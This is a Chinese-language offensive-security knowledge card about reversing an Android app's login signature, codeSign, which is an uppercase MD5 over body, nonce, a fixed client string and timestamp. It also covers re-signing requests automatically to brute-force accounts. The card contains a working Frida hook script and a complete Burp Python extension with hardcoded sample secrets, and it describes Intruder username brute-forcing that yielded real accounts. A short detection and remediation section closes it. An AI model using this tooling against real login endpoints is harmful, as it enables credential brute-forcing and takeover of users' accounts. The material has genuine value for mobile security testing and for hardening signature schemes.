---
id: mobile-android-login-codesign-md5-burp-auto-resign
title: Android 登录 codeSign 签名逆向与 Burp 自动重签：MD5(body+nonce+固定串+timestamp) 支撑账号爆破
type: scenario
domain: mobile
path: mobile/android
technique: android-login-codesign-md5-burp-auto-resign
aliases:
- codeSign 签名逆向
- 登录接口签名绕过
- Burp 自动重签
- MD5 body+nonce+timestamp
- Frida hook buildHeaders
- 账号密码爆破
tags:
- android
- login
- code-sign
- md5
- burp
- frida
- brute-force
- signature-bypass
- mobile
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V129
  verified_at: '2026-11-06T04:31:59+08:00'
  notes: 已对照原文及31张图核对：buildHeaders 中 codeSign=n0.c(nonce,body,timestamp)、n0.c 返回 s9.c.c(body+nonce+strG+timestamp).toUpperCase()、s9.c.c 使用 MD5、nonce 为去横线 UUID、strG hook 实测固定 50e8ecba013d385bda960968c95cbc77、Burp 扩展自动重签与 Intruder 爆破出 4 个账号均与截图一致；已修正卡内“buildHeaders 可打印 nonce”及“字段为 null 因此 g() 返回固定串”两处不严谨表述；原文未标注受影响版本，未设 affected_versions；PoC 未执行。
---

## 一句话结论

登录请求头的 `codeSign = MD5(body + nonce + fixedStrG + timestamp).toUpperCase()`：`nonce` 是去掉横线的 UUID，`timestamp` 是毫秒时间戳，`fixedStrG` 是 hook `g()` 得到的固定串。用 Frida hook `buildHeaders`/`n0.c`/`g()` 确认各分量与拼接顺序后，写 Burp Python 扩展在每次改包时按新 body 重算 `codeSign`，即可自动化账号密码爆破。

## 原理

- **请求头构造**：`QfInterceptor.buildHeaders(str, str2, str3)` 里：
  - `nonce = UUID.randomUUID().toString().replaceAll("-", "")`（`ACCEPT_TIME_SEPARATOR_SERVER = "-"`）；
  - `timestamp = System.currentTimeMillis()`；
  - `codeSign = n0.c(nonce, body, timestamp)`；
  - 同时把 `nonce`、`timestamp`、`codeSign` 写入请求头；服务端用这三个字段 + body 做绑定校验，改 username/body 会报“签名错误”。
- **签名函数**：`n0.c(str, str2, j10)` 先 `String strG = g()`，再 `return s9.c.c(str2 + str + strG + j10).toUpperCase()`；即 `body + nonce + fixedStrG + timestamp` 拼接后做哈希，最后转大写。
- **哈希算法**：`s9.c.c` 调用 `MessageDigest.getInstance(bf.f.f2250b).digest(str.getBytes())`，`bf.f.f2250b = "MD5"`；再经自定义 `b()` 转成十六进制字符串。`g()` 层层调用 `h()/i()`，`i()` 用 `StringBuffer(str + str2).reverse()` 反转；静态字段 `b5.a.f1760c0`/`f1762d0` 在 jadx 中显示为 null，但 hook 实测 `g()` 始终返回固定串（样本 `50e8ecba013d385bda960968c95cbc77`），直接 hook `g()` 取值即可。
- **为什么能绕过**：签名密钥/固定串在客户端，且没有服务端 nonce 一次性校验/设备绑定；攻击者拿到 body、nonce、timestamp、fixedStrG 后可以离线计算任意 body 的 codeSign。
- **Burp 自动重签**：扩展监听目标 URL（如 `/v5_0/user/login`），解析 JSON body，按与客户端一致的序列化（`json.dumps(..., separators=(',', ':'))`）重算 MD5，替换/新增 `codeSign` 头，再放行；配合 Intruder 即可对 username 字典爆破（密码固定），每次请求自动更新签名。
- **nonce/timestamp 可固定**：服务端只校验签名与字段一致，不要求 nonce 一次性；样本中固定 `nonce`/`timestamp`/`fixedStrG` 即可持续重签（若服务端有时间窗，则需同步更新 timestamp）。

## 触发条件

- App 登录接口为明文 JSON body，请求头含 `codeSign`、`nonce`、`timestamp` 等自定义字段；改 body 后返回“签名错误”。
- APK 未加固/未混淆到不可读，或可通过 Frida hook 拿到签名参数；无 Frida/root 检测。
- 签名算法为 MD5/SHA/HMAC 等可离线复刻的对称哈希，固定串/密钥在客户端可得。
- 有 Burp + Python 扩展环境；服务端未对登录做严格频率限制/验证码/设备绑定。

## 利用步骤

1. 抓包确认登录请求：body 明文 JSON，头含 `codeSign`、`nonce`、`timestamp`；改 username 触发“签名错误”确认绑定关系。
2. jadx 搜索 `codeSign`/`nonce`/`timestamp`，定位 `buildHeaders` 与 `n0.c`；跟到 `s9.c.c` 确认 `MessageDigest` 算法（MD5）。
3. Frida hook `buildHeaders` 打印 `str2`/`str3`（原文 hook_1 中 nonce 是局部变量取不到、输出 null，`str3` 为 body）；hook `n0.c` 打印 `str`（nonce）、`str2`（body）、`j10`（timestamp）；hook `g()` 确认 fixedStrG 为常量。
4. 在本地用 `MD5(body + nonce + fixedStrG + timestamp).upper()` 复算，与抓包 `codeSign` 对比；注意 body 必须与发送字节完全一致（JSON 键顺序/空格/转义）。
5. 写 Burp Python 扩展：解析目标请求、规范化 JSON、重算 codeSign、替换头；加载后对 Repeater/Intruder 生效。
6. 用 Intruder 对 username 字典爆破（密码固定），观察 200/长度差异；成功后用相同方法测试其他接口。

## PoC

Frida 定位参数：

```javascript
Java.perform(() => {
  const n0 = Java.use("com.xxxx.base.util.n0");
  const gOrig = n0.g;
  n0.g.implementation = function () {
    const v = gOrig.call(this);
    console.log("strG =", v);
    return v;
  };
  n0.c.implementation = function (str, str2, j10) {
    console.log("nonce =", str, "body =", str2, "ts =", j10);
    const combined = str2 + str + this.g() + j10;
    console.log("combined =", combined);
    const r = this.c(str, str2, j10);
    console.log("codeSign =", r);
    return r;
  };
});
```

Burp Python 扩展核心：

```python
# -*- coding: utf-8 -*-
from burp import IBurpExtender, IHttpListener
import json, hashlib

FIXED_NONCE = "0e206bf01fd3457eb7d03bb47988d792"
FIXED_STRG = "50e8ecba013d385bda960968c95cbc77"
FIXED_TS = "1762314071212"
TARGET_URL = "/v5_0/user/login"

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._cb = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Auto CodeSign Generator")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
        info = self._helpers.analyzeRequest(messageInfo)
        if TARGET_URL not in info.getUrl().toString():
            return
        body = messageInfo.getRequest()[info.getBodyOffset():]
        try:
            obj = json.loads(self._helpers.bytesToString(body))
        except Exception:
            return
        normalized = json.dumps(obj, ensure_ascii=False, separators=(",", ":"))
        raw = normalized + FIXED_NONCE + FIXED_STRG + FIXED_TS
        sign = hashlib.md5(raw.encode("utf-8")).hexdigest().upper()

        headers = [h for h in info.getHeaders()
                   if not h.strip().lower().startswith("codesign:")]
        headers.append("codeSign: " + sign)
        messageInfo.setRequest(self._helpers.buildHttpMessage(
            headers, self._helpers.stringToBytes(normalized)))
```

## 变体与关联

- **哈希/签名变体**：MD5/SHA1/SHA256/HMAC、RSA/ECDSA 签名；对称哈希可直接离线复刻，非对称签名需要私钥（通常不可行）。
- **参数拼接变体**：body+nonce+fixed+timestamp、按 key 排序的 query、URL 编码、JSON 规范化差异；以 hook 到的 `combined` 为准。
- **nonce 校验变体**：服务端要求 nonce 一次性/时间窗；需每次更新 nonce/timestamp 或从服务端获取。
- **加固变体**：native/白盒签名、Frida 检测、SSL Pinning；先绕过再 hook（见关联卡）。
- **关联卡片**：[[mobile-android-okhttp-addheader-stack-native-sign-locate]]（OkHttp addHeader 堆栈定位 native 签名）、[[mobile-android-aes-random-key-hook-fixed-iv-decrypt]]（请求体 AES 解密）、[[mobile-android-ssl-pinning-bypass-cert-frida]]（抓包绕过）。
- **边界**：服务端强绑定设备指纹/一次性 nonce/验证码/频率限制时，单纯重签不足以爆破；body 序列化不一致会导致签名错误。

## 检测与防御

- **检测特征**：登录请求头含 `codeSign`/`nonce`/`timestamp`；同一 nonce/timestamp 被大量不同 body 复用；Burp/脚本高频请求；改 body 后签名仍正确。
- **修复**：服务端 nonce 一次性 + 短时间窗 + 设备绑定；登录加验证码/风控/频率限制；签名密钥不要硬编码在客户端；使用标准 HMAC + 服务端密钥，或把关键校验放服务端。
- **分析建议**：先 hook 签名函数拿 `combined` 字符串，再复算；不要只按字段名猜拼接顺序。
